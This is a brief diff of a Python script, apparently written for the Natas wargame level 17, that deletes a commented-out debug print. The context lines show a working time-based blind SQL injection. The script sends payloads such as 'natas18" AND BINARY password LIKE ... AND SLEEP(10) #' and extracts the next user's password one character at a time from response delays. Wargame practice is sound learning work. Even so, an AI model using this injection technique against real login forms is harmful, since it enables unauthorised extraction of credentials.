@@ -60,7 +60,7 @@ while len(nataspass) < 32:
         for char in letters:
                 print(f"Attempting password: {nataspass}{char}")
                 response = requests.post(url, auth = (username, password), data = {"username" : 'natas18" AND BINARY password LIKE "' + nataspass + char + '%" AND SLEEP(10) #'})
-                #print(response.elapsed.total_seconds())
+        
                 if response.elapsed.total_seconds() > 10:
                         nataspass += char
                         print(nataspass)
